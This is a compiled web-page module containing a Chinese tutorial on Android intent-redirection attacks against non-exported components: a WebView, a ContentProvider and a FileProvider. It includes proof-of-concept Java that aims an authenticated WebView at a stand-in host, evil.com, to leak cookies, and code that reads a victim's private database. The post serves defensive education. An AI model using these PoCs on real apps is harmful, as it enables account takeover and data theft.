import{o as n,c as a,e as s}from"./app.06ec9772.js";const t='{"title":"为什么要保护未导出组件","description":"","frontmatter":{"title":"为什么要保护未导出组件","date":"2022-01-06T13:57:03.000Z","draft":false,"tags":["security","app","android"],"categories":["技术相关"]},"headers":[{"level":2,"title":"未导出的Activity篇","slug":"未导出的activity篇"},{"level":3,"title":"victim的manifest","slug":"victim的manifest"},{"level":3,"title":"ProxyActivity","slug":"proxyactivity"},{"level":3,"title":"victim的AuthWebViewActivity","slug":"victim的authwebviewactivity"},{"level":3,"title":"poc","slug":"poc"},{"level":2,"title":"未导出的ContentProvider","slug":"未导出的contentprovider"},{"level":3,"title":"victim的manifest:","slug":"victim的manifest-1"},{"level":3,"title":"attacker的导出Activity:","slug":"attacker的导出activity"},{"level":3,"title":"poc:","slug":"poc-1"},{"level":2,"title":"未导出的FileProvider","slug":"未导出的fileprovider"},{"level":3,"title":"victim的manifest","slug":"victim的manifest-2"},{"level":3,"title":"res/xml/provider_paths.xml","slug":"res-xml-provider-paths-xml"},{"level":3,"title":"attacker的LeakActivity","slug":"attacker的leakactivity"},{"level":3,"title":"攻击poc","slug":"攻击poc"}],"relativePath":"app_security/android_access_protected_components.md","lastUpdated":1642381064000}',p={},e=[s('<p>安卓App的核心是四大组件,而这四大组件之间的通信主要依赖于Intent. 四大组件有导出的,也有未导出的,导出的组件任意app都可以通过Intent来启动.而未导出的组件则只能App自己才能启动. 所以很多时候未导出组件都认为启动它的Intent是可信的. 但是如果我们可以绕开这个限制,就找到新的攻击点.</p><h1 id="为什么未导出组件需要保护好"><a class="header-anchor" href="#为什么未导出组件需要保护好" aria-hidden="true">#</a> 为什么未导出组件需要保护好</h1><h2 id="未导出的activity篇"><a class="header-anchor" href="#未导出的activity篇" aria-hidden="true">#</a> 未导出的Activity篇</h2><p>我们有一个未导出的Webview,只能打开我们信任的页面,并且它是未导出的.</p><h3 id="victim的manifest"><a class="header-anchor" href="#victim的manifest" aria-hidden="true">#</a> victim的manifest</h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.ProxyActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.AuthWebViewActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>同时app有一个ProxyActivity,用来启动其他Activity,并且是导出的.</p><h3 id="proxyactivity"><a class="header-anchor" href="#proxyactivity" aria-hidden="true">#</a> ProxyActivity</h3><p>ProxyActivity在后续例子中会一直使用.</p><div class="language-java line-numbers-mode"><pre><code><span class="token function">startActivity</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">)</span> <span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getParcelableExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="victim的authwebviewactivity"><a class="header-anchor" href="#victim的authwebviewactivity" aria-hidden="true">#</a> victim的AuthWebViewActivity</h3><p>因为AuthWebViewActivity是未导出的,所以它天然信任其数据来源<code>getIntent</code>,其代码如下:</p><div class="language-java line-numbers-mode"><pre><code>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringExtra</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getAuthHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> poc</h3><p>针对这种情况,我们就可以构造这样的攻击代码:</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.AuthWebViewActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://evil.com/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>达到AuthWebView访问evil.com的目的,进而泄露cookie,盗取用户敏感信息,甚至是窃取用户账号的控制权.</p><h2 id="未导出的contentprovider"><a class="header-anchor" href="#未导出的contentprovider" aria-hidden="true">#</a> 未导出的ContentProvider</h2><p>ContentProvider可以认为是App的数据库,如果一个未导出的ContentProvider设置了``android:grantUriPermissions`为true,那么攻击者就可能借此获取到相关文件以及数据的读写权限.</p><p>与ContentProvider相关的一些关键Flag:</p><ul><li><code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code> 永久访问这个ContentProvider的权限,没有设置的话只是一次性的.</li><li><code>Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code> 授予的权限不是某个固定的uri,而是一批uri,这些uri只要有共同的前缀即可.</li><li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code> 授予读权限</li><li><code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> 授予写权限</li></ul><p>下面我们来构造一个攻击样例:</p><h3 id="victim的manifest-1"><a class="header-anchor" href="#victim的manifest-1" aria-hidden="true">#</a> victim的manifest:</h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provider</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.ContentProvider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>authorities</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.provider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>grantUriPermissions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.ProxyActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>其中ProxyActivity同上.</p><h3 id="attacker的导出activity"><a class="header-anchor" href="#attacker的导出activity" aria-hidden="true">#</a> attacker的导出Activity:</h3><p>LeakActivity.java</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Uri</span> uri <span class="token operator">=</span> <span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDataString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;image/1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// content://com.victim.provider/image/1</span>\n<span class="token class-name">Bitmap</span> bitmap <span class="token operator">=</span> <span class="token class-name">BitmapFactory</span><span class="token punctuation">.</span><span class="token function">decodeStream</span><span class="token punctuation">(</span><span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openInputStream</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// stolen image</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc-1"><a class="header-anchor" href="#poc-1" aria-hidden="true">#</a> poc:</h3><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_PREFIX_URI_PERMISSION\n        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_READ_URI_PERMISSION\n        <span class="token operator">|</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_WRITE_URI_PERMISSION<span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;com.attacker.LeakActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.victim.provider/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h2 id="未导出的fileprovider"><a class="header-anchor" href="#未导出的fileprovider" aria-hidden="true">#</a> 未导出的FileProvider</h2><p>FileProvider实际上是ContentProvider的一个子类,如同名字一样,其专注于文件的分享. 下面我们同样构造一个FileProvider的文件任意读写的例子:</p><h3 id="victim的manifest-2"><a class="header-anchor" href="#victim的manifest-2" aria-hidden="true">#</a> victim的manifest</h3><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provider</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>androidx.core.content.FileProvider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>authorities</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>com.victim.files_provider<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>grantUriPermissions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta-data</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.support.FILE_PROVIDER_PATHS<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>@xml/provider_paths<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>provider</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>注意到:</p><ol><li>它是FileProvider</li><li>它的android:grantUriPermissions</li><li>分享路径信息在<code>@xml/provider_paths</code>,也就是<code>res/xml/provider_paths.xml</code></li></ol><h3 id="res-xml-provider-paths-xml"><a class="header-anchor" href="#res-xml-provider-paths-xml" aria-hidden="true">#</a> res/xml/provider_paths.xml</h3><div class="language-xml line-numbers-mode"><pre><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>paths</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>root<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>files-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>internal_files<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cache-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cache<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>external-path</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>external_files<span class="token punctuation">&quot;</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>images<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>paths</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>这里顺便说一下,如无必要,尽量不要直接分享root,这是非常危险的,一旦被获取到权限,整个app的所有信息都会一览无余.</p><h3 id="attacker的leakactivity"><a class="header-anchor" href="#attacker的leakactivity" aria-hidden="true">#</a> attacker的LeakActivity</h3><p>attacker要能收到相应的Intent,才能获取到文件的读写权限. LeakActivity.java</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">InputStream</span> i <span class="token operator">=</span> <span class="token function">getContentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openInputStream</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> \n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="攻击poc"><a class="header-anchor" href="#攻击poc" aria-hidden="true">#</a> 攻击poc</h3><p>和ContentProvider是类似的,只不过这次针对的是FileProvider.</p><div class="language-java line-numbers-mode"><pre><code><span class="token class-name">Intent</span> extra <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token class-name">Intent</span><span class="token punctuation">.</span>FLAG_GRANT_READ_URI_PERMISSION<span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token function">getPackageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;com.attacker.LeakActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nextra<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">&quot;content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">&quot;com.victim&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;com.victim.ProxyActivity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nintent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">&quot;extra_intent&quot;</span><span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>参考文档: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noopener noreferrer">Android: Access to app protected components</a></p>',46)];p.render=function(s,t,p,o,c,l){return n(),a("div",null,e)};export{t as __pageData,p as default};
